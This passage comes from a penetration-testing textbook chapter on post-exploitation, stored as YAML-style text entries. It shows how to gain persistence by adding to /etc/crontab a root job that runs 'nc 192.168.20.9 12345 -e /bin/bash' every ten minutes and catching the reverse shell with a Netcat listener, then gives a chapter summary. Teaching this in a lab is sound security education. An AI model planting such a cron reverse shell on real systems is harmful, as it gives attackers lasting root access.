    time. For example, we can set up a `cron` job to automatically run a Metasploit
    payload or even just use Netcat to connect back to us.
  prefs: []
  type: TYPE_NORMAL
- en: Open */etc/crontab* on your Linux target. The following line will run the command
    `nc 192.168.20.9 12345 -e /bin/bash` every ten minutes of every hour of every
    day of every month—basically every ten minutes. The command will be run as root.
    Add this line to the end of the */etc/crontab* file. (For help, see [Automating
    Tasks with cron Jobs](ch02.xhtml#automating_tasks_with_cron_jobs "Automating Tasks
    with cron Jobs").)
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE65]'
  prefs: []
  type: TYPE_PRE
- en: Now restart the `cron` service by entering **`service cron restart`**. Set up
    a Netcat listener on port 12345 on your Kali machine, and at the next ten-minute
    mark, the `cron` job should run, and you should receive a root shell at your Netcat
    listener.
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: In this chapter we’ve covered just a few post-exploitation techniques, barely
    skimming the surface of the wealth of interesting tools and techniques available.
    We looked at some methods for escalating our privileges on an exploited system.
    We also looked at methods of gathering local information. We studied methods of
    turning access to one system into access to many, including pivoting from one
    network to another through an open session. Finally, we looked at a couple of
    methods for making our access permanent.
  prefs: []
  type: TYPE_NORMAL
